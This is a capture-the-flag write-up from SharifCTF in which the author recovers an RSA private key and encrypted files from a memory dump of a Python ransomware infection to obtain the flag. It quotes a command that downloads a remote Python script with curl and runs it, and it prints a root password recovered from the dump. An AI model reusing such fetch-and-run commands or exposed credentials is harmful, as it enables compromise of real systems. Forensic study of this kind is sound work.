By searching the string `locky`, we can get to the Python script (ransomware in Python)
It generates a 4096 RSA private key and encrypts files using this key in rounds 0-13 (depending on time)
Encrypted files are saved with .locky extension and public key as .locky_$stamp (see the code) and private key as privkey.pem
Looking for private key PEM header `BEGIN RSA PRIVATE KEY`, we can get private key from the dump.
We just need the encrypted file to get the flag. A search for ".locking" will list files that are encrypted: file_1 to file_5.
The dump contains the result of "ls -la" command which gives us more details. `file_5` with size of 44 can be the flag.

```
root@debian:~/dump# ls -al
total 44
drwx------  3 root root 4096 Nov 30 07:46 .
drwxr-xr-x 22 root root 4096 Aug 24 12:36 ..
-rw-------  1 root root  694 Nov 30 07:43 .bash_history
-rw-r--r—  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  2 root root 4096 Nov 30 05:54 dump
-rw-r--r—  1 root root   21 Nov 30 07:46 file_1
-rw-r--r—  1 root root   21 Nov 30 07:46 file_2
-rw-r--r—  1 root root   21 Nov 30 07:46 file_3
-rw-r--r—  1 root root   21 Nov 30 07:46 file_4
-rw-r--r—  1 root root   44 Nov 30 07:46 file_5
-rw-r--r—  1 root root  140 Nov 19  2007 .profile
```

By running the Python ransomware in the test environment, it is obvious that the final encrypted file size (with 44 bytes as input) is 512 bytes.
We dumped our test process’s memory. Looking at the dump we got, and based on our sample encrypted files, we can see there is a signature before encrypted bytes in memory.
Finding result of one of rounds is enough because max(round) = 13 (see line 26 of code: round = stamp % 14 )

That signature was `0002000000000000FFFFFFFFFFFFFFFF00000000` ; searching this in the dump, we select 512 bytes after it (we got 4 files)
Decrypting these files using private key 13 times and saving each round led us to the flag.

```
$ grep -n -r SharifCTF *
1.bin_11.txt:1:SharifCTF{df90036c153c345dc707d693225f29e3}
```

The stamp is also used in public key filename and available in dump and we can use it but 13 is too small and not important that much


Search "curl -fsSL"  to see link of Python files downloaded and executed:
```
root@debian:~/dump# /usr/bin/python -c "$(curl -fsSL https://a.uguu.se/0RLtwwwAqLuw.py)"
```
—
We also got what seems to be the root password from dump(xD) : Ya@Abbas

`WARNING: DO NOT RUN RANSOMWARE.PY ON YOU SYSTEM`